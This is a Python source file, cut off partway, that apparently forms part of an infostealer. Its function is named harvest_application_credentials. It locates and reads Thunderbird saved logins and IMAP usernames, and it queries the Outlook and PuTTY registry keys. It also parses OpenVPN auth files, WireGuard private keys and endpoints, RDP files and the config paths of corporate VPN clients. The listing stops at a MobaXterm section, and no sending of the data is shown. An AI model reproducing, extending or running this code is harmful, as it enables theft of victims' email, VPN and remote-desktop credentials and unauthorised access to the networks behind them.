import os
import sys
import json
import glob
import re
import platform
import struct
import sqlite3
import base64
import xml.etree.ElementTree as ET
import configparser

def harvest_application_credentials():
    """Extract credentials from desktop applications.
    Targets: email clients (Outlook, Thunderbird, Evolution),
    VPN configs (OpenVPN, WireGuard, FortiClient, Cisco AnyConnect, GlobalProtect),
    RDP files, PuTTY/MobaXterm sessions, FileZilla, TeamViewer,
    Slack/Discord/Teams tokens, database management tools.
    """
    home = os.path.expanduser('~')
    sys_name = platform.system()
    results = {'email_clients': [], 'vpn_configs': [], 'rdp_files': [],
               'remote_access': [], 'messaging_tokens': [], 'db_tools': []}

    # ── 1. Email Clients ──
    # Thunderbird
    tb_profiles = []
    if sys_name == 'Linux':
        tb_profiles = glob.glob(os.path.join(home, '.thunderbird', '*'))
    elif sys_name == 'Darwin':
        tb_profiles = glob.glob(os.path.join(home, 'Library', 'Thunderbird', 'Profiles', '*'))
    elif sys_name == 'Windows':
        tb_profiles = glob.glob(os.path.join(home, 'AppData', 'Roaming', 'Thunderbird', 'Profiles', '*'))
    for profile in tb_profiles:
        if os.path.isdir(profile):
            entry = {'client': 'Thunderbird', 'profile': profile}
            # Check for stored passwords
            logins_json = os.path.join(profile, 'logins.json')
            if os.path.isfile(logins_json):
                try:
                    with open(logins_json, 'r') as f:
                        data = json.load(f)
                    logins = data.get('logins', [])
                    entry['saved_accounts'] = [{
                        'hostname': l.get('hostname', ''),
                        'username': l.get('encryptedUsername', '')[:30],
                        'encrypted': True,
                    } for l in logins[:20]]
                except Exception:
                    pass
            # IMAP/SMTP accounts from prefs.js
            prefs_js = os.path.join(profile, 'prefs.js')
            if os.path.isfile(prefs_js):
                try:
                    with open(prefs_js, 'r') as f:
                        content = f.read()
                    servers = re.findall(r'mail\.server\.server\d+\.hostname.*?"([^"]+)"', content)
                    users = re.findall(r'mail\.server\.server\d+\.userName.*?"([^"]+)"', content)
                    entry['imap_servers'] = servers[:10]
                    entry['usernames'] = users[:10]
                except Exception:
                    pass
            # key3.db / key4.db for NSS master password
            entry['has_key_db'] = os.path.isfile(os.path.join(profile, 'key4.db')) or os.path.isfile(os.path.join(profile, 'key3.db'))
            results['email_clients'].append(entry)

    # Outlook profiles (Windows registry or macOS plist)
    if sys_name == 'Windows':
        import subprocess
        try:
            proc = subprocess.run(['reg', 'query', r'HKCU\Software\Microsoft\Office\16.0\Outlook\Profiles',
                                   '/s'], capture_output=True, text=True, timeout=10)
            if proc.returncode == 0:
                # Parse email addresses and server names
                emails = re.findall(r'Email\s+REG_SZ\s+(\S+)', proc.stdout)
                servers = re.findall(r'(?:POP|IMAP|SMTP)\s+Server\s+REG_SZ\s+(\S+)', proc.stdout)
                if emails or servers:
                    results['email_clients'].append({
                        'client': 'Outlook', 'emails': emails[:10], 'servers': servers[:10]})
        except Exception:
            pass
    elif sys_name == 'Darwin':
        outlook_plist = os.path.join(home, 'Library', 'Group Containers',
                                     'UBF8T346G9.Office', 'Outlook', 'Outlook 15 Profiles')
        if os.path.isdir(outlook_plist):
            results['email_clients'].append({'client': 'Outlook macOS', 'path': outlook_plist,
                                              'profiles': os.listdir(outlook_plist)[:10]})

    # Evolution (GNOME)
    evolution_dir = os.path.join(home, '.local', 'share', 'evolution', 'mail')
    if os.path.isdir(evolution_dir):
        results['email_clients'].append({'client': 'Evolution', 'path': evolution_dir})

    # ── 2. VPN Configs ──
    # OpenVPN
    ovpn_locations = [
        os.path.join(home, '*.ovpn'), os.path.join(home, 'Documents', '*.ovpn'),
        os.path.join(home, 'Downloads', '*.ovpn'), '/etc/openvpn/*.conf',
        '/etc/openvpn/client/*.conf', '/etc/openvpn/client/*.ovpn',
    ]
    for pattern in ovpn_locations:
        for ovpn_file in glob.glob(pattern):
            entry = {'type': 'OpenVPN', 'path': ovpn_file}
            try:
                with open(ovpn_file, 'r') as f:
                    content = f.read()
                entry['remote'] = re.findall(r'remote\s+(\S+)', content)[:3]
                entry['has_embedded_key'] = '<key>' in content or '<cert>' in content
                entry['has_auth_pass'] = 'auth-user-pass' in content
                auth_file = re.search(r'auth-user-pass\s+(\S+)', content)
                if auth_file:
                    auth_path = auth_file.group(1)
                    if os.path.isfile(auth_path):
                        try:
                            with open(auth_path, 'r') as af:
                                lines = af.readlines()
                            entry['auth_user'] = lines[0].strip() if lines else None
                            entry['auth_pass_length'] = len(lines[1].strip()) if len(lines) > 1 else 0
                        except Exception:
                            pass
            except Exception:
                pass
            results['vpn_configs'].append(entry)

    # WireGuard
    wg_locations = ['/etc/wireguard/*.conf', os.path.join(home, '.config', 'wireguard', '*.conf'),
                    os.path.join(home, '*.conf')]
    for pattern in wg_locations:
        for wg_file in glob.glob(pattern):
            try:
                with open(wg_file, 'r') as f:
                    content = f.read()
                if '[Interface]' in content and 'PrivateKey' in content:
                    privkey = re.search(r'PrivateKey\s*=\s*(\S+)', content)
                    endpoint = re.search(r'Endpoint\s*=\s*(\S+)', content)
                    results['vpn_configs'].append({
                        'type': 'WireGuard', 'path': wg_file,
                        'has_private_key': bool(privkey),
                        'private_key_preview': privkey.group(1)[:8] + '...' if privkey else None,
                        'endpoint': endpoint.group(1) if endpoint else None,
                    })
            except Exception:
                pass

    # FortiClient / Cisco AnyConnect / GlobalProtect
    vpn_client_configs = [
        ('FortiClient', os.path.join(home, 'AppData', 'Roaming', 'FortiClient', 'conf')),
        ('FortiClient', '/etc/forticlient/config.xml'),
        ('Cisco AnyConnect', os.path.join(home, '.cisco', 'network_access_manager', 'system', 'profiles')),
        ('Cisco AnyConnect', '/opt/cisco/anyconnect/profile'),
        ('GlobalProtect', os.path.join(home, 'AppData', 'Local', 'Palo Alto Networks', 'GlobalProtect')),
        ('GlobalProtect', '/opt/paloaltonetworks/globalprotect'),
    ]
    for vpn_name, vpn_path in vpn_client_configs:
        if os.path.exists(vpn_path):
            results['vpn_configs'].append({'type': vpn_name, 'path': vpn_path,
                                            'is_dir': os.path.isdir(vpn_path)})

    # ── 3. RDP Files ──
    rdp_locations = [os.path.join(home, '*.rdp'), os.path.join(home, 'Documents', '*.rdp'),
                     os.path.join(home, 'Desktop', '*.rdp'), os.path.join(home, 'Downloads', '*.rdp')]
    for pattern in rdp_locations:
        for rdp_file in glob.glob(pattern):
            entry = {'path': rdp_file}
            try:
                with open(rdp_file, 'r') as f:
                    content = f.read()
                entry['server'] = re.search(r'full address:s:(\S+)', content)
                entry['server'] = entry['server'].group(1) if entry['server'] else None
                entry['username'] = re.search(r'username:s:(\S+)', content)
                entry['username'] = entry['username'].group(1) if entry['username'] else None
                entry['has_password'] = 'password 51:b:' in content
                entry['gateway'] = re.search(r'gatewayhostname:s:(\S+)', content)
                entry['gateway'] = entry['gateway'].group(1) if entry['gateway'] else None
            except Exception:
                pass
            results['rdp_files'].append(entry)

    # ── 4. Remote Access Tools ──
    # PuTTY (Windows registry)
    if sys_name == 'Windows':
        import subprocess
        try:
            proc = subprocess.run(['reg', 'query', r'HKCU\Software\SimonTatham\PuTTY\Sessions', '/s'],
                                  capture_output=True, text=True, timeout=10)
            if proc.returncode == 0:
                sessions = re.findall(r'HKEY_CURRENT_USER\\Software\\SimonTatham\\PuTTY\\Sessions\\(.+)', proc.stdout)
                for sess in sessions:
                    entry = {'tool': 'PuTTY', 'session': sess}
                    host = re.search(rf'{re.escape(sess)}.*?HostName\s+REG_SZ\s+(\S+)', proc.stdout, re.DOTALL)
                    if host:
                        entry['hostname'] = host.group(1)
                    user = re.search(rf'{re.escape(sess)}.*?UserName\s+REG_SZ\s+(\S+)', proc.stdout, re.DOTALL)
                    if user:
                        entry['username'] = user.group(1)
                    results['remote_access'].append(entry)
        except Exception:
            pass

    # MobaXterm (encrypted passwords in registry)
    if sys_name == 'Windows':
